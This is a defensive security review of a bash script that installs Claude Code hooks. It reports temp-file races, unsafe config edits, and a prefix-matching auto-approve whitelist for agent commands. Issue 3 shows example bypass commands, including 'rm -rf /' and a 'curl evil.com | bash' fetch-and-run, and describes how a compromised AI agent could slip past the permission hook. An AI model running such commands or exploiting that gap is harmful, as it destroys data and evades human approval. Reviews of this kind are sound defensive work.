# Adversarial Security Review Report

**Scope:** scripts/linux/optimize-claude.sh  
**Reviewer:** Manual adversarial analysis (Gemini API unavailable due to rate limits)  
**Date:** 2026-04-07  
**Risk Assessment:** HIGH

---

## Executive Summary

**Overall Risk Level: HIGH**

The `optimize-claude.sh` script contains multiple security vulnerabilities that could lead to data loss, privilege escalation, and system compromise. The most critical issues include race conditions with temporary files, unsafe in-place file modifications, and a dangerously permissive auto-approve whitelist that could allow command injection attacks.

---

## Critical Issues (Must Fix Immediately)

### Issue 1: Race Condition in Temporary File Creation
- **Location:** Lines 303, 511, 570, 759, 1035, 1056
- **Risk Level:** CRITICAL
- **Evidence:**
  ```bash
  ERR_OUTPUT=$(mktemp)
  temp_file="/tmp/claude-resize-$(basename "$FILE_PATH")"
  temp_txt="/tmp/claude-pdf-$(date +%s).txt"
  ```
- **Description:** The script creates temporary files with predictable names in world-writable directories (`/tmp`). The `mktemp` command is used for some files but the pretooluse.sh hook creates predictable temp files using `date +%s` which only has second granularity, making collisions possible.
- **Attack Vector:** An attacker could create symlinks in `/tmp` pointing to sensitive files (e.g., `/etc/passwd`, `~/.bashrc`). When the script runs, it may follow these symlinks and overwrite critical system or user files.
- **Remediation:**
  ```bash
  # Use mktemp with secure patterns
  temp_file=$(mktemp /tmp/claude-resize.XXXXXX)
  temp_txt=$(mktemp /tmp/claude-pdf.XXXXXX)
  
  # Always cleanup with trap
  cleanup() { rm -f "$temp_file" "$temp_txt"; }
  trap cleanup EXIT INT TERM
  ```

### Issue 2: Unsafe In-Place File Modifications Without Validation
- **Location:** Lines 760-761, 766-767, 803-809
- **Risk Level:** CRITICAL
- **Evidence:**
  ```bash
  sed "/$BLOCK_START/,/$BLOCK_END/d" "$SHELL_CONFIG_PATH" > "$TEMP_FILE"
  mv "$TEMP_FILE" "$SHELL_CONFIG_PATH"
  echo "" >> "$SHELL_CONFIG_PATH"
  echo "$ENV_BLOCK" >> "$SHELL_CONFIG_PATH"
  ```
- **Description:** The script modifies shell configuration files (`.bashrc`, `.zshrc`, etc.) by redirecting output and using `mv` without verifying file integrity first. If the script is interrupted mid-operation, the shell config could be partially written or empty.
- **Attack Vector:** System crash or interruption during `configure_privacy()` could leave the user with a broken shell configuration, potentially locking them out of their shell or corrupting their environment.
- **Remediation:**
  ```bash
  # Create backup first
  cp "$SHELL_CONFIG_PATH" "$SHELL_CONFIG_PATH.backup.$(date +%Y%m%d%H%M%S)"
  
  # Use atomic write pattern
  TEMP_FILE=$(mktemp)
  if sed "/$BLOCK_START/,/$BLOCK_END/d" "$SHELL_CONFIG_PATH" > "$TEMP_FILE"; then
      cat >> "$TEMP_FILE" << 'EOF'
  # ... config block ...
  EOF
      # Atomic replacement
      mv "$TEMP_FILE" "$SHELL_CONFIG_PATH" || { rm -f "$TEMP_FILE"; return 1; }
  fi
  ```

### Issue 3: Auto-Approve Hook Contains Dangerous Whitelist Bypass
- **Location:** Lines 1233-1262 (in embedded auto-approve.sh hook)
- **Risk Level:** CRITICAL
- **Evidence:**
  ```bash
  SAFE_PREFIXES=(
      "cat "
      "echo "
      "git status"
      "npm run"
      "pip list"
      "Write-Host"
      "type "
      "dir "
  )
  for prefix in "${SAFE_PREFIXES[@]}"; do
      if [[ "$COMMAND" == "$prefix" || "$COMMAND" == "$prefix"* ]]; then
          printf '{"hookSpecificOutput":{"permissionDecision":"allow"}}'
          exit 0
      fi
  done
  ```
- **Description:** The auto-approve whitelist uses simple prefix matching which is trivially bypassed. Commands like `cat /etc/passwd; rm -rf /` or `echo foo; curl evil.com | bash` would match the whitelist and be auto-approved.
- **Attack Vector:** An attacker or compromised Claude instance could construct commands that start with a "safe" prefix but contain malicious payloads after semicolons, pipes, or command substitution.
- **Remediation:**
  ```bash
  # Validate command contains no shell metacharacters
  if [[ "$COMMAND" =~ [;|&$(){}\`\<\>] ]]; then
      exit 0  # Defer to manual approval
  fi
  
  # Use exact matching, not prefix matching
  case "$COMMAND" in
      "ls"|"pwd"|"git status"|"git log"|"git branch")
          printf '{"hookSpecificOutput":{"permissionDecision":"allow"}}'
          ;;
      *)
          exit 0
          ;;
  esac
  ```

### Issue 4: Shell Injection in JSON Manipulation
- **Location:** Lines 813-830 (Python heredoc)
- **Risk Level:** HIGH
- **Evidence:**
  ```bash
  $PYTHON_CMD << PYTHON_EOF
  import json
  with open('$CLAUDE_CONFIG', 'r') as f:
      config = json.load(f)
  PYTHON_EOF
  ```
- **Description:** The `CLAUDE_CONFIG` variable is embedded directly into a Python heredoc without escaping. If `CLAUDE_CONFIG` contains a path with special characters or quotes, it could break out of the string context.
- **Attack Vector:** If an attacker can control the `CLAUDE_CONFIG_DIR` environment variable (which influences `CLAUDE_CONFIG`), they could inject Python code via the path string.
- **Remediation:**
  ```bash
  # Pass variables as environment variables instead
  CLAUDE_CONFIG_PATH="$CLAUDE_CONFIG" $PYTHON_CMD -c '
  import json, os, sys
  config_path = os.environ["CLAUDE_CONFIG_PATH"]
  with open(config_path, "r") as f:
      config = json.load(f)
  # ...
  '
  ```

### Issue 5: Unquoted Variables in Critical Operations
- **Location:** Lines 306-307, 313, 320, 351-358, 409-416
- **Risk Level:** HIGH
- **Evidence:**
  ```bash
  if pip3 install --user markitdown 2>"$ERR_OUTPUT"; then
  sudo apt-get update && sudo apt-get install -y imagemagick
  ```
- **Description:** Multiple commands use unquoted variables and error output redirection that could fail if paths contain spaces. The `sudo` commands are executed without validation of what will be installed.
- **Attack Vector:** Path traversal or command injection if `OS`, `DISTRO`, or `ERR_OUTPUT` contain malicious values.
- **Remediation:**
  ```bash
  # Always quote variables
  if pip3 install --user markitdown 2>"${ERR_OUTPUT}"; then
      
  # Validate OS/DISTRO before executing commands
  case "$DISTRO" in
      debian|rhel|arch) ;;  # Known good
      *) print_error "Unknown distribution"; return 1 ;;
  esac
  ```

---

## High Risk Issues (Fix Soon)

### Issue 6: Sed In-Place Editing Without Backup
- **Location:** Lines 808-809
- **Risk Level:** HIGH
- **Evidence:**
  ```bash
  sed -i.bak 's/"autoCompactEnabled": false/"autoCompactEnabled": true/g' "$CLAUDE_CONFIG" 2>/dev/null || \
  sed -i '' 's/"autoCompactEnabled": false/"autoCompactEnabled": true/g' "$CLAUDE_CONFIG"
  ```
- **Description:** The script attempts to use `sed -i` for in-place editing of JSON files, which is fragile and can corrupt files if the pattern doesn't match exactly. It also leaves `.bak` files behind.
- **Attack Vector:** JSON files with nested structures or escaped quotes could be mangled by naive string replacement.
- **Remediation:** Use the Python JSON manipulation consistently instead of sed for JSON files.

### Issue 7: No Validation of Hook Script Integrity
- **Location:** Lines 992-1100 (pretooluse.sh creation)
- **Risk Level:** HIGH
- **Description:** The script creates hook files that execute with the user's permissions, but there's no verification that the created scripts weren't tampered with or corrupted during creation.
- **Attack Vector:** If the script is interrupted during hook creation, partial/corrupted hooks could be left in place that may execute incorrectly.
- **Remediation:** Verify hook scripts are complete and syntactically valid before marking them executable:
  ```bash
  # Validate bash syntax before making executable
  if bash -n "$HOOKS_DIR/pretooluse.sh"; then
      chmod +x "$HOOKS_DIR/pretooluse.sh"
  else
      rm -f "$HOOKS_DIR/pretooluse.sh"
      print_error "Hook script validation failed"
      return 1
  fi
  ```

### Issue 8: Predictable Backup Naming Allows Symlink Attacks
- **Location:** Lines 803, 1360
- **Risk Level:** MEDIUM
- **Evidence:**
  ```bash
  cp "$CLAUDE_CONFIG" "$CLAUDE_CONFIG.backup.$(date +%Y%m%d%H%M%S)"
  ```
- **Description:** Backup files use predictable timestamps, making them susceptible to symlink attacks if an attacker pre-creates symlinks at predictable backup paths.
- **Remediation:** Use `mktemp` for backup names or verify the backup path doesn't exist/isn't a symlink before writing.

---

## Medium/Low Risk Issues

### Issue 9: File-Guard Hook Pattern Bypass
- **Location:** Lines 1145-1151, 1159-1167
- **Risk Level:** MEDIUM
- **Evidence:**
  ```bash
  target="${target/#\~/$HOME}"
  if echo "$path" | grep -qE "$pattern"; then
  ```
- **Description:** The file-guard hook attempts to block access to sensitive files, but the pattern matching can be bypassed using alternative path representations (e.g., `/home/user/.env` instead of `~/.env`, or using symlinks).
- **Remediation:** Canonicalize paths before checking:
  ```bash
  # Resolve symlinks and normalize path
  canonical_path=$(readlink -f "$path" 2>/dev/null || realpath "$path" 2>/dev/null || echo "$path")
  ```

### Issue 10: Missing Input Validation on FILE_PATH
- **Location:** Lines 1035-1042 (pretooluse.sh)
- **Risk Level:** MEDIUM
- **Evidence:**
  ```bash
  temp_file="/tmp/claude-resize-$(basename "$FILE_PATH")"
  cp "$temp_file" "$FILE_PATH"
  ```
- **Description:** The hook script copies processed files back to the original path without validating that `FILE_PATH` is safe. A maliciously crafted `FILE_PATH` could overwrite arbitrary files.
- **Remediation:** Validate that the file path is within expected directories before writing.

### Issue 11: ImageMagick Command Injection Risk
- **Location:** Lines 1037-1039
- **Risk Level:** MEDIUM
- **Evidence:**
  ```bash
  magick "$FILE_PATH" -resize "${MAX_DIMENSION}x${MAX_DIMENSION}>" -quality "$QUALITY" "$temp_file"
  ```
- **Description:** The `FILE_PATH` is passed directly to ImageMagick without validation. ImageMagick has a history of vulnerabilities, and specially crafted file names could potentially exploit parsing bugs.
- **Remediation:** Validate file paths don't contain ImageMagick special characters (`@`, `%`, etc.) before passing to magick/convert.

### Issue 12: Sudo Usage Without TTY/Password Consideration
- **Location:** Lines 351, 409, 499
- **Risk Level:** MEDIUM
- **Description:** The script runs `sudo` commands assuming passwordless sudo or active TTY. This can fail in non-interactive environments and may hang waiting for input.
- **Remediation:** Check for non-interactive environments and skip or warn about sudo requirements.

### Issue 13: set -e Inconsistency with Error Handling
- **Location:** Line 14
- **Risk Level:** LOW
- **Evidence:**
  ```bash
  set -e  # Exit on error
  ```
- **Description:** The script uses `set -e` but also uses `|| true` in some places (line 773), creating inconsistent error handling behavior that could mask failures.
- **Remediation:** Be consistent with error handling - either trust `set -e` or use explicit error checking throughout.

### Issue 14: No Cleanup of Old Backup Files
- **Location:** Lines 803, 1360
- **Risk Level:** LOW
- **Description:** Backup files accumulate over time with no cleanup mechanism, potentially consuming disk space.
- **Remediation:** Add cleanup of old backups (e.g., keep only last 10 backups).

---

## Security Best Practice Recommendations

1. **Implement Defense in Depth**: The auto-approve hook should use multiple validation layers, not just prefix matching.

2. **Use Atomic File Operations**: All file modifications should follow the pattern: write to temp file, verify integrity, then atomic move.

3. **Validate All External Input**: Environment variables, file paths, and command arguments should be validated before use.

4. **Implement Proper Cleanup**: All temporary files should have associated trap handlers for cleanup.

5. **Add Integrity Checks**: Verify hook scripts are complete and valid before execution.

6. **Use Principle of Least Privilege**: Don't auto-approve any commands that could modify state - even "read-only" commands can have side effects.

7. **Canonicalize Paths**: Resolve all paths to their canonical form before security checks.

8. **Audit Trail**: Log all security-relevant decisions to a persistent log (not just `/tmp` which can be cleared).

---

## Summary Table

| Issue | Location | Risk | Category | Status |
|-------|----------|------|----------|--------|
| Race Condition in Temp Files | 303, 511, 570, 759, 1035, 1056 | CRITICAL | File System | Unfixed |
| Unsafe In-Place Modifications | 760-761, 766-767, 803-809 | CRITICAL | Data Loss | Unfixed |
| Auto-Approve Whitelist Bypass | 1233-1262 | CRITICAL | Command Injection | Unfixed |
| Shell Injection in Python | 813-830 | HIGH | Code Injection | Unfixed |
| Unquoted Variables | 306-307, 313, 320, 351-358 | HIGH | Command Injection | Unfixed |
| Sed In-Place Editing | 808-809 | HIGH | Data Integrity | Unfixed |
| Hook Integrity Validation | 992-1100 | HIGH | Integrity | Unfixed |
| Predictable Backup Names | 803, 1360 | MEDIUM | File System | Unfixed |
| File-Guard Bypass | 1145-1151, 1159-1167 | MEDIUM | Access Control | Unfixed |
| FILE_PATH Validation | 1035-1042 | MEDIUM | File System | Unfixed |
| ImageMagick Injection | 1037-1039 | MEDIUM | Command Injection | Unfixed |
| Sudo TTY Issues | 351, 409, 499 | MEDIUM | Execution | Unfixed |
| set -e Inconsistency | 14 | LOW | Error Handling | Unfixed |
| Backup Cleanup | 803, 1360 | LOW | Maintenance | Unfixed |

---

## Top 5 Priority Fixes

1. **[CRITICAL] Fix auto-approve whitelist**: Remove or completely redesign the auto-approve feature. The current prefix-based whitelist is trivially bypassed and extremely dangerous. (Lines 1233-1262)

2. **[CRITICAL] Secure temp file handling**: Replace all predictable temp file names with `mktemp` and add trap handlers for cleanup. (Lines 303, 511, 570, 759, 1035, 1056)

3. **[CRITICAL] Atomic file operations**: Implement atomic write patterns for all shell config modifications with proper backup and validation. (Lines 760-761, 766-767)

4. **[HIGH] Validate hook scripts**: Add syntax validation before marking hook scripts executable to prevent partial/corrupted hooks from running. (Lines 992-1100)

5. **[HIGH] Fix shell injection**: Pass variables to Python heredocs via environment variables instead of string interpolation. (Lines 813-830)

---

**Disclaimer**: This review was conducted manually as the Gemini API was unavailable. The findings are based on static analysis of the code and common bash security vulnerability patterns. A dynamic analysis (runtime testing) may reveal additional issues.
